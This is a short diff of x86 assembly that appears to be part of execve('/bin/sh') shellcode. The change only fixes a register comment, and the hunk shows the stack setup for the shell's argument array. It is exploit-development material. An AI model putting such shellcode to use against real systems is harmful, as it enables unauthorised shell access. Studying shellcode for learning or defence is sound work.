@@ -12,7 +12,7 @@ mystart:
     pop     edx         ; third parameter - NULL
     pop     ebx         ; first parameter - "/bin/sh"
     push    eax         ; push NULL onto stack
-    mov     eax, ebx    ; copy RDI into RAX
+    mov     eax, ebx    ; copy ebx into eax
     push    eax         ; push "/bin/sh" onto the stack
     push    esp         ; assign pointer to start of the stack
     pop     ecx         ; second parameter - pointer to {"/bin/sh", NULL} 
